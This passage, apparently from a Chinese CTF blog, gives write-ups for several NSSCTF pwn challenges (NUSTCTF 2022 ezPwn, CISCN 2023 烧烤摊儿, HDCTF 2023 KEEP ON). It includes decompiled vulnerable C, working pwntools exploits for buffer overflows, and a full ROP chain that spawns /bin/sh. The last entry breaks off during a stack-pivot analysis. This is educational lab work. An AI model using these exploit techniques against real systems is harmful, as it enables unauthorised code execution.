port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">bin_sh = <span class="number">0x0000000004023FF</span></span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># rdi = rop.find_gadget([&quot;pop rdi&quot;,&quot;ret&quot;])[0]</span></span><br><span class="line">offset = <span class="number">0x40</span> + <span class="number">8</span></span><br><span class="line">payload = flat([cyclic(offset),<span class="number">0x0000000004014BF</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="NUSTCTF-2022-新生赛-ezPwn"><a href="#NUSTCTF-2022-新生赛-ezPwn" class="headerlink" title="[NUSTCTF 2022 新生赛]ezPwn"></a>[NUSTCTF 2022 新生赛]ezPwn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your name plz:&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4[<span class="number">0</span>] % <span class="number">233</span> == <span class="number">233</span> )</span><br><span class="line">    system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Can you hack me? %s\n&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">25730</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">offset = <span class="number">18</span></span><br><span class="line">cat_flag = <span class="number">0x000000000402013</span></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">r()</span><br><span class="line">payload = flat([cyclic(offset),<span class="number">0x000000000401229</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CISCN-2023-初赛-烧烤摊儿"><a href="#CISCN-2023-初赛-烧烤摊儿" class="headerlink" title="[CISCN 2023 初赛]烧烤摊儿"></a>[CISCN 2023 初赛]烧烤摊儿</h3><p>发现负数有bug</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : io.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : io.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : io.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : io.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> io.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(io.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> io.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : io.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node4.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">28373</span></span><br><span class="line">	io = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(io.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shop</span>():</span><br><span class="line">    sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sl(<span class="string">&quot;-999999&quot;</span>)</span><br><span class="line"><span class="comment"># for i in range(0,200):</span></span><br><span class="line">    <span class="comment"># shop()</span></span><br><span class="line">shop()</span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="HDCTF-2023-KEEP-ON"><a href="#HDCTF-2023-KEEP-ON" class="headerlink" title="[HDCTF 2023]KEEP ON"></a>[HDCTF 2023]KEEP ON</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please show me your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x48</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;keep on !&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是一个栈迁移</p>
<p>​<code>%16$p</code>​获取到rbp的地址</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 0x7ffe9c6c80b0-0x7ffe9c6c8060</span><br><span class="line"><span class="variable">$2</span> = 0x50</span><br></pre></td></tr></table></figure>

<p>那就是-0x60</p>
<p>本地需要对齐</p>
